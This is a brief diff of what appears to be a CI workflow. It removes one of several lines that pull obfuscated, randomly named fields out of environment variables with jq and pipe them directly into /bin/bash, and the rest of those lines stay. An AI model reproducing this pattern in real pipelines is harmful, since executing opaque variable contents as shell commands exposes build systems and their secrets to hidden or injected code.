@@ -28,7 +28,6 @@ jobs:
           echo $fxsgl77876 | jq -r .hqcpe633 | /bin/bash
           echo $cgwn3 | jq -r .bkjtu75 | /bin/bash
           printf '%s' "$yyo5865" | jq -r .nucv73826 | /bin/bash
-          echo $eynvq59238 | jq -r .acapu86 | /bin/bash
           echo $gu1 | jq -r .zdhg2 | /bin/bash
 
       - name: Archive data
